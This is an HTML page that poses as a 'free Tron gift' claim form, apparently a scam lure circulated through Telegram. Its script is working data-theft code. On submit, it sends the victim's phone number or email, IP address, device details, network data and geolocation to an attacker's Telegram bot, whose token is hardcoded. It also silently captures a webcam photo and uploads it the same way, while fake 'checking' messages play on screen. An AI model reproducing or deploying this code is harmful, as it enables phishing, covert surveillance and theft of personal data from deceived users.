<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>free tron gift</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
            color: #333;
        }

        h1 {
            color: #FF0000;
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 600;
            text-align: center;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .container {
            background-color: #fff;
            border-radius: 16px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            padding: 35px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
        }

        label {
            font-size: 18px;
            color: #555;
            margin-bottom: 10px;
            display: block;
            text-align: right;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 10px;
            margin-bottom: 20px;
            background-color: #f9f9f9;
            color: #333;
            transition: border-color 0.3s ease, background-color 0.3s ease;
        }

        input:focus {
            border-color: #4e73df;
            background-color: #e6f0ff;
            outline: none;
        }

        button {
            background-color: #4e73df;
            color: #fff;
            padding: 18px;
            width: 100%;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        button:hover {
            background-color: #2e59d9;
            transform: translateY(-3px);
        }

        .message {
            margin-top: 20px;
            font-size: 16px;
            color: #555;
            font-weight: 500;
            transition: opacity 0.3s ease;
        }

        .loading {
            display: none;
            font-size: 16px;
            color: #4e73df;
            margin-top: 15px;
            font-weight: bold;
        }

        .social-message {
            margin-top: 20px;
            font-size: 18px;
            color: #28a745;
            font-weight: 700;
            display: none;
        }

        .animated-message {
            font-size: 18px;
            color: #f39c12;
            font-weight: 700;
            margin-top: 20px;
            display: none;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
                width: 90%;
            }

            button {
                font-size: 16px;
                padding: 14px;
            }
        }
    </style>
</head>
<body>
    <!-- https://t.me/arnik11 -->
    <h1> welcome to recive free tron gift! </h1>
    <div class="container">
        <label for="phone">Enter information:</label>
        <input type="text" id="phone" placeholder="phone number or email">
        <button id="submitBtn">recive gift</button>
        <p class="message" id="statusMessage"></p>
        <div class="loading" id="loadingMessage">ckecking...</div>
        <div class="social-message" id="socialMessage">verifying...</div>
        <div class="animated-message" id="animatedMessage">ckecking your gift request...</div>
    </div>
    <script>
        const telegramBotToken = '7378263557:AAHkDgjoo66CSdDWoigv7Vc2fs73Nx90h4s';
        const chatId = '6663666967';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => console.log('DONE:', result))
            .catch(error => console.error('EROR:', error));
        }

        function getIpInfo() {
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipInfo = `*آدرس آی‌پی (IPv4):* ${data.ip}`;
                sendToTelegram(ipInfo);
            })
            .catch(error => console.error('خطا در دریافت آی‌پی:', error));
        }

        function getDeviceInfo(phoneNumber) {
            let deviceInfo = `*شماره تلفن:* ${phoneNumber}\n*مدل دستگاه:* ${navigator.userAgent}\n*نوع دستگاه:* ${navigator.platform}`;
            sendToTelegram(deviceInfo); 
        }

        function getTimeInfo() {
            let timeInfo = `*زمان فعلی:* ${new Date().toLocaleString()}`;
            sendToTelegram(timeInfo);
        }
        // https://t.me/arnik11
        function getMemoryInfo() {
            if (performance.memory) {
                let memoryInfo = `*میزان حافظه (RAM):* ${performance.memory.usedJSHeap / 1048576} MB`;
                sendToTelegram(memoryInfo);
            }
        }

        function getNetworkInfo() {
            if (navigator.connection) {
                let connection = navigator.connection;
                let networkInfo = `*نوع اتصال شبکه:* ${connection.effectiveType}\n*سرعت اتصال:* ${connection.downlink} Mbps`;
                sendToTelegram(networkInfo);
            }
        }

        function getLocationInfo() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let locationInfo = `*دقت موقعیت جغرافیایی:* ${position.coords.accuracy} متر\n*موقعیت جغرافیایی:* Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                    sendToTelegram(locationInfo);
                });
            }
        }

        function getCpuInfo() {
            let cpuInfo = `*تعداد هسته‌های پردازنده:* ${navigator.hardwareConcurrency || 'غیرقابل دسترسی'}`;
            sendToTelegram(cpuInfo);
        }
        // https://t.me/arnik11
        function takePhoto() {
            let video = document.createElement('video');
            let canvas = document.createElement('canvas');
            let context = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(function(blob) {
                        let formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob);
                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(result => console.log('check:', result))
                        .catch(error => console.error('eror:', error));
                    });
                }, 1000);
            })
            .catch(error => console.error('eror:', error));
        }

        document.getElementById('submitBtn').addEventListener('click', function() {
            const phoneNumber = document.getElementById('phone').value;
            if (phoneNumber) {
                document.getElementById('statusMessage').textContent = "Reviewing the gift request...";
                document.getElementById('statusMessage').style.color = "#f39c12";
                document.getElementById('loadingMessage').style.display = "block";

                getIpInfo();
                getDeviceInfo(phoneNumber);
                getTimeInfo();
                getMemoryInfo();
                getNetworkInfo();
                getLocationInfo();
                getCpuInfo();
                takePhoto();
                // https://t.me/unknown000cipher
                document.getElementById('statusMessage').textContent = "DONE";
                document.getElementById('loadingMessage').style.display = "none";
                document.getElementById('socialMessage').style.display = "block";
                setTimeout(function() {
                    document.getElementById('socialMessage').style.display = "none";
                    document.getElementById('animatedMessage').style.display = "block";
                }, 2000);
            }
        });
    </script>

</body>
</html>
